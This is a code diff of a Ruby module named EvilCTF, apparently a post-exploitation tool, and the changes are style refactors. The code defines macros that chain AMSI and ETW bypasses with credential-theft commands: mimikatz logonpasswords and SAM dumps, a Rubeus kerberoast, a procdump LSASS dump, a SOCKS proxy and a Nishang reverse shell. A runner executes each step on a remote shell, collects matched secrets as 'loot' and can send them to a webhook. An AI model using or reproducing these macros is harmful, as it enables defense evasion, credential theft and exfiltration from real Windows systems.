@@ -18,13 +18,16 @@ module EvilCTF
         'dom_enum' => ['powerview']
       }.freeze
 
-      PLACEHOLDER_PATTERN = /\[(AttackerIP|AttackerPort|NishangRevRemote|InveighRemote)\]/.freeze
+      PLACEHOLDER_PATTERN = /\[(AttackerIP|AttackerPort|NishangRevRemote|InveighRemote)\]/
 
       def build_macros
         {
-          'kerberoast' => [BYPASS_4MSI_PS, '& "C:\\Users\\Public\\Rubeus.exe" kerberoast /outfile:C:\\Users\\Public\\hashes.txt 2>$null'],
-          'dump_creds' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\mimikatz.exe" "privilege::debug" "sekurlsa::logonpasswords" exit 2>$null'],
-          'lsass_dump' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\procdump64.exe" -accepteula -ma lsass.exe "C:\\Users\\Public\\lsass.dmp"'],
+          'kerberoast' => [BYPASS_4MSI_PS,
+                           '& "C:\\Users\\Public\\Rubeus.exe" kerberoast /outfile:C:\\Users\\Public\\hashes.txt 2>$null'],
+          'dump_creds' => [BYPASS_4MSI_PS, ETW_BYPASS_PS,
+                           '& "C:\\Users\\Public\\mimikatz.exe" "privilege::debug" "sekurlsa::logonpasswords" exit 2>$null'],
+          'lsass_dump' => [BYPASS_4MSI_PS, ETW_BYPASS_PS,
+                           '& "C:\\Users\\Public\\procdump64.exe" -accepteula -ma lsass.exe "C:\\Users\\Public\\lsass.dmp"'],
           'invoke-mimikatz' => [
             BYPASS_4MSI_PS,
             ETW_BYPASS_PS,
@@ -37,8 +40,10 @@ module EvilCTF
           'bypass-etw' => [ETW_BYPASS_PS],
           'bypass-4msi' => [BYPASS_4MSI_PS],
           'inveigh_start' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, INVEIGH_START_PS],
-          'socks_init' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, 'Import-Module "C:\\Users\\Public\\socks.ps1"; Invoke-SocksProxy -BindPort 1080'],
-          'cred_harvest' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\mimikatz.exe" "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" exit 2>$null'],
+          'socks_init' => [BYPASS_4MSI_PS, ETW_BYPASS_PS,
+                           'Import-Module "C:\\Users\\Public\\socks.ps1"; Invoke-SocksProxy -BindPort 1080'],
+          'cred_harvest' => [BYPASS_4MSI_PS, ETW_BYPASS_PS,
+                             '& "C:\\Users\\Public\\mimikatz.exe" "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" exit 2>$null'],
           'nishang_rev' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, NISHANG_REV_PS],
           'powerview_all' => [BYPASS_4MSI_PS, POWERVIEW_ALL_PS],
           'dom_enum' => [BYPASS_4MSI_PS, DOM_ENUM_PS]
@@ -139,19 +144,17 @@ module EvilCTF
 
         replacements ||= {}
         macro.each do |step|
-          begin
-            resolved_step = resolve_macro_step(step, replacements)
-            exec_res = EvilCTF::Execution.run(shell, resolved_step, timeout: 120)
-            puts exec_res.output.to_s.strip
-            matches = EvilCTF::Tools.grep_output(exec_res.output)
-            if matches.any?
-              EvilCTF::Tools.save_loot(matches, event_logfile: loot_event_logfile)
-              EvilCTF::Tools.beacon_loot(webhook, matches) if webhook
-            end
-          rescue StandardError => e
-            puts "[!] Macro step failed: #{e.message}"
-            return false
+          resolved_step = resolve_macro_step(step, replacements)
+          exec_res = EvilCTF::Execution.run(shell, resolved_step, timeout: 120)
+          puts exec_res.output.to_s.strip
+          matches = EvilCTF::Tools.grep_output(exec_res.output)
+          if matches.any?
+            EvilCTF::Tools.save_loot(matches, event_logfile: loot_event_logfile)
+            EvilCTF::Tools.beacon_loot(webhook, matches) if webhook
           end
+        rescue StandardError => e
+          puts "[!] Macro step failed: #{e.message}"
+          return false
         end
         true
       end
